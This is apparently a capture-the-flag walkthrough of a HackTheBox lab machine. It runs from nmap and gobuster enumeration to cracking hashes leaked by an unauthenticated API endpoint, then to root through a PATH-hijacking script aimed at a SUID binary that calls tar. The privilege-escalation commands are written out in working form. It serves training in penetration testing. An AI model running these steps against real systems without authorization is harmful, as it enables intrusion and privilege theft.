---
title: "Example Box"
date: "2025-01-15"
tags: ["Linux", "Web", "Privilege Escalation"]
description: "Walkthrough of the Example box from HackTheBox — exploiting a vulnerable web application and escalating privileges via a misconfigured SUID binary."
difficulty: "Medium"
---

## Reconnaissance

Starting with an Nmap scan to enumerate open ports and services:

```bash
nmap -sC -sV -oN nmap/initial 10.10.10.100
```

Results show two interesting ports:

- **Port 22** — OpenSSH 8.9
- **Port 80** — Apache 2.4 hosting a web application

## Enumeration

Running Gobuster against the web server to discover hidden directories:

```bash
gobuster dir -u http://10.10.10.100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Found `/admin` and `/api` endpoints. The `/api/users` endpoint returns user data without authentication — an IDOR vulnerability.

## Foothold

The API exposes password hashes. After cracking with Hashcat:

```bash
hashcat -m 1400 hashes.txt /usr/share/wordlists/rockyou.txt
```

We obtain credentials for the `webadmin` user and SSH in:

```bash
ssh webadmin@10.10.10.100
```

## Privilege Escalation

Checking for SUID binaries:

```bash
find / -perm -4000 -type f 2>/dev/null
```

A custom binary `/opt/backup` has the SUID bit set and is owned by root. Running `strings` reveals it calls `tar` without an absolute path. We exploit this via PATH hijacking:

```bash
echo '#!/bin/bash' > /tmp/tar
echo '/bin/bash -p' >> /tmp/tar
chmod +x /tmp/tar
export PATH=/tmp:$PATH
/opt/backup
```

Root shell obtained. Flags captured.

## Key Takeaways

- Always check API endpoints for authorization issues
- SUID binaries that call system commands without absolute paths are prime targets for PATH hijacking
- Enumerate thoroughly before attempting exploitation
